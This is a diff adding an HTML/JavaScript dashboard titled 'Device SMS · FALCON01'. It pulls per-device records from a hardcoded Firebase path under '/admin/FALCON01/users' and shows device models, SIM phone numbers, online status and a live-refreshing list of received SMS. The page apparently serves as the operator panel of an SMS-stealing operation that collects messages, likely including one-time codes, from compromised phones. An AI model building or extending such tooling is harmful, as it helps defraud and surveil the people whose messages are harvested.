@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Device SMS · FALCON01</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: #0a0e14;
+            color: #e6edf3;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: #161b22; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #58a6ff; }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+            padding: 16px 24px;
+            background: #161b22;
+            border-radius: 16px;
+            border: 1px solid #30363d;
+            margin-bottom: 24px;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .back-btn {
+            background: transparent;
+            color: #58a6ff;
+            border: 1px solid #30363d;
+            padding: 8px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .back-btn:hover {
+            background: #1c2333;
+            border-color: #58a6ff;
+        }
+        .device-title {
+            font-size: 20px;
+            font-weight: 600;
+        }
+        .device-subtitle {
+            font-size: 14px;
+            color: #8b949e;
+        }
+        .header-actions {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+        }
+        .badge {
+            background: #21262d;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            color: #8b949e;
+        }
+        .badge span { color: #f0f6fc; font-weight: 600; }
+
+        /* ===== DEVICE INFO ===== */
+        .device-info {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 24px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+        }
+        .info-item {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .info-item .label {
+            font-size: 11px;
+            color: #8b949e;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .info-item .value {
+            font-size: 16px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .info-item .value .number-chip {
+            background: #1c2333;
+            padding: 2px 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            font-family: monospace;
+            color: #58a6ff;
+            border: 1px solid #30363d;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .copy-chip {
+            background: transparent;
+            border: none;
+            color: #8b949e;
+            cursor: pointer;
+            font-size: 14px;
+            padding: 0 4px;
+            transition: color 0.2s;
+        }
+        .copy-chip:hover { color: #f0f6fc; }
+
+        /* ===== STATS BAR ===== */
+        .sms-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 12px;
+            margin-bottom: 24px;
+        }
+        .sms-stat {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 12px 16px;
+            text-align: center;
+        }
+        .sms-stat .number {
+            font-size: 24px;
+            font-weight: 600;
+            color: #f0f6fc;
+        }
+        .sms-stat .label {
+            font-size: 11px;
+            color: #8b949e;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-top: 2px;
+        }
+
+        /* ===== SMS LIST ===== */
+        .sms-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .sms-item {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 12px;
+            padding: 16px 20px;
+            transition: all 0.2s;
+            animation: slideIn 0.3s ease;
+        }
+        .sms-item:hover {
+            border-color: #58a6ff;
+        }
+        .sms-item.new {
+            border-left: 4px solid #3fb950;
+            background: #1b242b;
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .sms-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+        .sms-sender {
+            font-weight: 600;
+            color: #58a6ff;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .sms-sender .badge-sim {
+            font-size: 10px;
+            background: #21262d;
+            padding: 1px 8px;
+            border-radius: 8px;
+            color: #8b949e;
+            font-weight: 400;
+        }
+        .sms-time {
+            font-size: 12px;
+            color: #8b949e;
+        }
+        .sms-message {
+            font-size: 15px;
+            line-height: 1.6;
+            color: #e6edf3;
+            word-break: break-word;
+            white-space: pre-wrap;
+        }
+        .sms-message .highlight {
+            background: #1c2333;
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: #d29922;
+            font-family: monospace;
+        }
+
+        /* ===== LOADING ===== */
+        .loading {
+            text-align: center;
+            padding: 60px 20px;
+            color: #8b949e;
+        }
+        .spinner {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 4px solid #21262d;
+            border-top: 4px solid #58a6ff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-bottom: 16px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .no-sms {
+            text-align: center;
+            padding: 60px 20px;
+            color: #8b949e;
+        }
+        .no-sms .icon { font-size: 48px; margin-bottom: 12px; opacity: 0.3; }
+
+        /* ===== TOAST ===== */
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #21262d;
+            color: #f0f6fc;
+            padding: 12px 28px;
+            border-radius: 12px;
+            font-size: 14px;
+            border: 1px solid #30363d;
+            opacity: 0;
+            transition: all 0.3s ease;
+            pointer-events: none;
+            z-index: 999;
+            backdrop-filter: blur(10px);
+        }
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .header { flex-direction: column; align-items: stretch; }
+            .header-left { flex-wrap: wrap; }
+            .device-info { grid-template-columns: 1fr; }
+            .sms-stats { grid-template-columns: repeat(2, 1fr); }
+        }
+        @media (max-width: 480px) {
+            .sms-stats { grid-template-columns: 1fr; }
+            .device-title { font-size: 16px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="toast" class="toast">✅ Copied!</div>
+
+    <!-- ===== HEADER ===== -->
+    <div class="header">
+        <div class="header-left">
+            <button class="back-btn" onclick="goBack()">← Back</button>
+            <div>
+                <div class="device-title" id="deviceTitle">Loading...</div>
+                <div class="device-subtitle" id="deviceSubtitle">—</div>
+            </div>
+        </div>
+        <div class="header-actions">
+            <span class="badge">💬 <span id="smsCount">0</span> messages</span>
+            <button class="back-btn" onclick="refreshDetail()" style="border-color:#238636;color:#3fb950;">⟳ Refresh</button>
+        </div>
+    </div>
+
+    <!-- ===== DEVICE INFO ===== -->
+    <div class="device-info" id="deviceInfo">
+        <div class="info-item">
+            <span class="label">Device ID</span>
+            <span class="value" id="infoId" style="font-family:monospace;font-size:13px;">—</span>
+        </div>
+        <div class="info-item">
+            <span class="label">Phone Numbers</span>
+            <div class="value" id="infoNumbers">—</div>
+        </div>
+        <div class="info-item">
+            <span class="label">Created</span>
+            <span class="value" id="infoCreated">—</span>
+        </div>
+        <div class="info-item">
+            <span class="label">Status</span>
+            <span class="value" id="infoStatus">—</span>
+        </div>
+    </div>
+
+    <!-- ===== SMS STATS ===== -->
+    <div class="sms-stats" id="smsStats">
+        <div class="sms-stat">
+            <div class="number" id="statTotal">0</div>
+            <div class="label">Total SMS</div>
+        </div>
+        <div class="sms-stat">
+            <div class="number" id="statToday">0</div>
+            <div class="label">Today</div>
+        </div>
+        <div class="sms-stat">
+            <div class="number" id="statSenders">0</div>
+            <div class="label">Unique Senders</div>
+        </div>
+        <div class="sms-stat">
+            <div class="number" id="statLatest">—</div>
+            <div class="label">Latest</div>
+        </div>
+    </div>
+
+    <!-- ===== SMS LIST ===== -->
+    <div id="smsListContainer">
+        <div id="loadingSms" class="loading">
+            <div class="spinner"></div>
+            <p>Loading messages...</p>
+        </div>
+        <div id="smsList" class="sms-list" style="display:none;"></div>
+        <div id="noSms" class="no-sms" style="display:none;">
+            <div class="icon">📭</div>
+            <p>No SMS messages found</p>
+            <p style="font-size:13px;color:#8b949e;margin-top:4px;">Messages will appear here when received</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ============================================================
+    // CONFIG
+    // ============================================================
+    const DB_URL = 'https://fortydata-fee65-default-rtdb.firebaseio.com/admin/FALCON01/users.json';
+    const WS_URL = 'wss://echo.websocket.org';
+
+    // ============================================================
+    // STATE
+    // ============================================================
+    let deviceId = null;
+    let deviceData = null;
+    let messages = [];
+    let ws = null;
+    let reconnectTimer = null;
+
+    // ============================================================
+    // DOM REFS
+    // ============================================================
+    const $ = (s) => document.querySelector(s);
+    const $$ = (s) => document.querySelectorAll(s);
+
+    const deviceTitle = $('#deviceTitle');
+    const deviceSubtitle = $('#deviceSubtitle');
+    const smsCount = $('#smsCount');
+    const infoId = $('#infoId');
+    const infoNumbers = $('#infoNumbers');
+    const infoCreated = $('#infoCreated');
+    const infoStatus = $('#infoStatus');
+    const statTotal = $('#statTotal');
+    const statToday = $('#statToday');
+    const statSenders = $('#statSenders');
+    const statLatest = $('#statLatest');
+    const smsList = $('#smsList');
+    const loadingSms = $('#loadingSms');
+    const noSms = $('#noSms');
+    const toast = $('#toast');
+
+    // ============================================================
+    // HELPERS
+    // ============================================================
+    function formatTimestamp(ts) {
+        if (!ts) return '—';
+        const d = new Date(ts);
+        return d.toLocaleString('en-IN', {
+            day: '2-digit', month: 'short', year: 'numeric',
+            hour: '2-digit', minute: '2-digit', second: '2-digit',
+            hour12: true
+        });
+    }
+
+    function formatTime(ts) {
+        if (!ts) return '—';
+        const d = new Date(ts);
+        return d.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit', hour12: true });
+    }
+
+    function isToday(ts) {
+        if (!ts) return false;
+        const today = new Date();
+        const date = new Date(ts);
+        return date.getDate() === today.getDate() &&
+               date.getMonth() === today.getMonth() &&
+               date.getFullYear() === today.getFullYear();
+    }
+
+    function escapeHtml(str) {
+        if (!str) return '';
+        const div = document.createElement('div');
+        div.textContent = str;
+        return div.innerHTML;
+    }
+
+    function extractNumbers(simInfo) {
+        const nums = new Set();
+        if (!simInfo) return [];
+        ['sim1', 'sim2'].forEach(slot => {
+            const sim = simInfo[slot];
+            if (sim?.number) {
+                let n = sim.number.trim().replace(/^\+?91/, '');
+                if (n) nums.add(n);
+            }
+        });
+        if (simInfo.number) {
+            let n = simInfo.number.trim().replace(/^\+?91/, '');
+            if (n) nums.add(n);
+        }
+        return Array.from(nums);
+    }
+
+    function getMessages(userData) {
+        const msgs = [];
+        if (userData.receivedSms) {
+            for (const [key, sms] of Object.entries(userData.receivedSms)) {
+                msgs.push({ id: key, ...sms });
+            }
+        }
+        msgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+        return msgs;
+    }
+
+    function showToast(msg) {
+        toast.textContent = msg;
+        toast.classList.add('show');
+        clearTimeout(toast._timer);
+        toast._timer = setTimeout(() => toast.classList.remove('show'), 2000);
+    }
+
+    function copyToClipboard(text, btn) {
+        navigator.clipboard?.writeText(text).then(() => {
+            showToast('✅ Copied: ' + text);
+            if (btn) {
+                btn.textContent = '✅';
+                setTimeout(() => btn.textContent = '📋', 1000);
+            }
+        }).catch(() => {
+            const ta = document.createElement('textarea');
+            ta.value = text;
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            ta.remove();
+            showToast('✅ Copied: ' + text);
+        });
+    }
+
+    // ============================================================
+    // LOAD DEVICE DATA
+    // ============================================================
+    async function loadDevice() {
+        const params = new URLSearchParams(window.location.search);
+        deviceId = params.get('id');
+        if (!deviceId) {
+            deviceTitle.textContent = '❌ No device specified';
+            return;
+        }
+
+        try {
+            const resp = await fetch(DB_URL);
+            if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
+            const data = await resp.json();
+
+            const user = data[deviceId];
+            if (!user) {
+                deviceTitle.textContent = '❌ Device not found';
+                return;
+            }
+
+            deviceData = { id: deviceId, data: user };
+            messages = getMessages(user);
+            renderDevice();
+            renderMessages();
+            connectWebSocket();
+
+        } catch (err) {
+            console.error('Load error:', err);
+            deviceTitle.textContent = '❌ Error loading device';
+            showToast('Error: ' + err.message);
+        }
+    }
+
+    // ============================================================
+    // RENDER DEVICE
+    // ============================================================
+    function renderDevice() {
+        const info = deviceData.data.deviceInfo || {};
+        const model = info.model || 'Unknown';
+        const brand = info.brand || info.manufacturer || '';
+        const numbers = extractNumbers(deviceData.data.simInfo);
+        const msgCount = messages.length;
+        const online = deviceData.data.online;
+
+        deviceTitle.textContent = `${model}`;
+        deviceSubtitle.textContent = brand || 'Unknown device';
+        smsCount.textContent = msgCount;
+
+        infoId.textContent = deviceId;
+        infoNumbers.innerHTML = numbers.map(n => `
+            <span class="number-chip">
+                ${n}
+                <button class="copy-chip" onclick="copyToClipboard('${n}', this)">📋</button>
+            </span>
+        `).join('') || '<span style="color:#8b949e;">No numbers</span>';
+
+        infoCreated.textContent = formatTimestamp(deviceData.data.userCreated);
+        infoStatus.textContent = online ? '🟢 Online' : '⚪ Offline';
+        infoStatus.style.color = online ? '#3fb950' : '#8b949e';
+
+        // Stats
+        const todayCount = messages.filter(m => isToday(m.timestamp)).length;
+        const uniqueSenders = new Set(messages.map(m => m.sender)).size;
+        const latest = messages.length > 0 ? messages[0] : null;
+
+        statTotal.textContent = msgCount;
+        statToday.textContent = todayCount;
+        statSenders.textContent = uniqueSenders;
+        statLatest.textContent = latest ? formatTime(latest.timestamp) : '—';
+    }
+
+    // ============================================================
+    // RENDER MESSAGES
+    // ============================================================
+    function renderMessages() {
+        loadingSms.style.display = 'none';
+
+        if (messages.length === 0) {
+            smsList.style.display = 'none';
+            noSms.style.display = 'block';
+            return;
+        }
+
+        smsList.style.display = 'flex';
+        noSms.style.display = 'none';
+
+        let html = '';
+        for (const msg of messages) {
+            const isNew = msg._new || false;
+            html += `
+                <div class="sms-item ${isNew ? 'new' : ''}">
+                    <div class="sms-header">
+                        <span class="sms-sender">
+                            ${escapeHtml(msg.sender || 'Unknown')}
+                            ${msg.simSlot ? `<span class="badge-sim">SIM ${msg.simSlot}</span>` : ''}
+                        </span>
+                        <span class="sms-time">${formatTimestamp(msg.timestamp)}</span>
+                    </div>
+                    <div class="sms-message">${escapeHtml(msg.message || '')}</div>
+                </div>
+            `;
+        }
+        smsList.innerHTML = html;
+    }
+
+    // ============================================================
+    // WEBSOCKET
+    // ============================================================
+    function connectWebSocket() {
+        if (ws?.readyState === WebSocket.OPEN || ws?.readyState === WebSocket.CONNECTING) return;
+
+        try {
+            ws = new WebSocket(WS_URL);
+
+            ws.onopen = () => {
+                if (ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({
+                        action: 'subscribe',
+                        channel: 'FALCON01',
+                        deviceId: deviceId
+                    }));
+                }
+            };
+
+            ws.onmessage = (event) => {
+                try {
+                    const payload = JSON.parse(event.data);
+                    if (payload?.deviceId === deviceId && payload?.sms) {
+                        handleNewSms(payload.sms);
+                    }
+                } catch (e) { /* ignore */ }
+            };
+
+            ws.onclose = () => {
+                clearTimeout(reconnectTimer);
+                reconnectTimer = setTimeout(connectWebSocket, 3000);
+            };
+
+            ws.onerror = () => ws.close();
+        } catch (e) {
+            clearTimeout(reconnectTimer);
+            reconnectTimer = setTimeout(connectWebSocket, 3000);
+        }
+    }
+
+    function handleNewSms(smsData) {
+        const newSms = {
+            id: 'ws_' + Date.now(),
+            sender: smsData.sender || 'Unknown',
+            message: smsData.message || '',
+            timestamp: smsData.timestamp || Date.now(),
+            _new: true
+        };
+
+        messages.unshift(newSms);
+        renderMessages();
+        renderDevice();
+
+        // Remove new flag after 3 seconds
+        setTimeout(() => {
+            newSms._new = false;
+            renderMessages();
+        }, 3000);
+
+        showToast(`📩 New SMS from ${newSms.sender}`);
+    }
+
+    // ============================================================
+    // NAVIGATION
+    // ============================================================
+    function goBack() {
+        window.close();
+        // Fallback
+        if (window.history.length > 1) {
+            window.history.back();
+        } else {
+            window.location.href = 'index.html';
+        }
+    }
+
+    function refreshDetail() {
+        loadDevice();
+        showToast('🔄 Refreshed');
+    }
+
+    // ============================================================
+    // AUTO-REFRESH
+    // ============================================================
+    setInterval(() => {
+        if (!document.hidden) {
+            loadDevice();
+        }
+    }, 15000); // Every 15 seconds
+
+    // ============================================================
+    // INIT
+    // ============================================================
+    loadDevice();
+</script>
+</body>
+</html>
